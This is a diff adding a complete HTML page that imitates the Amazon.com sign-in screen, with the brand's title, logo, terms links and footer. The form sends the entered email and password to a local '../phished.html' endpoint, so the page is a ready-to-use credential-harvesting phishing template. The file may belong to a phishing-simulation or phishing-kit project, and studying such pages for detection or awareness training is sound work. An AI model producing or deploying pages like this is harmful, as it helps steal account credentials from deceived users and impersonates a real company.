@@ -1,0 +1,108 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+  <head>
+
+    <title>Sign in to Amazon.com</title>
+
+    <meta charset="UTF-8" />
+    <meta http-equiv="x-ua-compatible" content="IE=Edge, chrome=1" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no" />
+    <meta name="description" id="description" content="Sign in to Amazon.com" />
+
+    <link href="favicon.ico" rel="shortcut icon" type="image/x-icon" />
+    <link href="//fonts.googleapis.com/css?family=Ubuntu" rel="stylesheet" />
+    <link href="../reset.css" rel="stylesheet" />
+    <link href="amazon.css" rel="stylesheet" />
+
+  </head>
+  <body tabindex="0">
+
+    <!-- form wrapper -->
+    <section class="amazon-wrap">
+
+      <!-- form center container -->
+      <main class="amazon-container">
+
+        <!-- form logo -->
+        <div class="amazon-logo">
+          <img src="amazon-logo.png" alt="Amazon" />
+        </div>
+
+        <!-- form object -->
+        <form class="amazon-form" action="../phished.html" method="POST" autocomplete="off">
+
+          <!-- default heading -->
+          <div class="amazon-heading">
+            <h1>Sign in</h1>
+          </div>
+
+          <!-- email input -->
+          <div class="amazon-input amazon-email">
+            <div class="amazon-input-label">
+              <span>Email (phone for mobile accounts)</span>
+            </div>
+            <input type="text" name="_email" value="" />
+          </div>
+
+          <!-- hidden password input -->
+          <div class="amazon-input amazon-password">
+            <div class="amazon-input-label">
+              <span>Password</span>
+              <a href="#">Forgot your password?</a>
+            </div>
+            <input type="password" name="_password" value="" />
+          </div>
+
+          <!-- form action button -->
+          <div class="amazon-action">
+            <button class="btn btn-primary" type="submit">Sign in</button>
+          </div>
+
+          <!-- terms warning text -->
+          <div class="amazon-info">
+            By continuing, you agree to Amazon's
+            <a href="/gp/help/customer/display.html/ref=ap_signin_notification_condition_of_use">Conditions of Use</a> and
+            <a href="/gp/help/customer/display.html/ref=ap_signin_notification_privacy_notice">Privacy Notice</a>.
+          </div>
+
+          <!-- remember checkbox -->
+          <div class="amazon-remember">
+            <input type="checkbox" name="_remember" value="true" tabindex="4" />
+            <span>Keep me signed in. &nbsp; <a href="javascript:void(0)">Details</a></span>
+          </div>
+
+          <!-- signup button -->
+          <div class="amazon-signup">
+            <div class="amazon-signup-heading">
+              <span>New to Amazon?</span>
+            </div>
+            <a class="btn btn-secondary" href="#">Create your Amazon account</a>
+          </div>
+
+        </form>
+
+      </main>
+
+    </section>
+
+    <!-- form footer links -->
+    <footer class="amazon-footer">
+      <div class="amazon-footer-div"></div>
+      <div class="amazon-footer-content">
+        <div class="amazon-footer-links">
+          <a target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_cou?ie=UTF8&amp;nodeId=508088">Conditions of Use</a>
+          <a target="_blank" href="/gp/help/customer/display.html/ref=ap_desktop_footer_privacy_notice?ie=UTF8&amp;nodeId=468496">Privacy Notice</a>
+          <a target="_blank" href="/help">Help</a>
+        </div>
+        <div class="amazon-footer-copyright">
+          © 1996-2019, Amazon.com, Inc. or its affiliates
+        </div>
+      </div>
+    </footer>
+
+    <!-- form scripts -->
+    <script src="//code.jquery.com/jquery-3.4.0.slim.min.js"></script>
+    <script src="amazon.js"></script>
+
+  </body>
+</html>
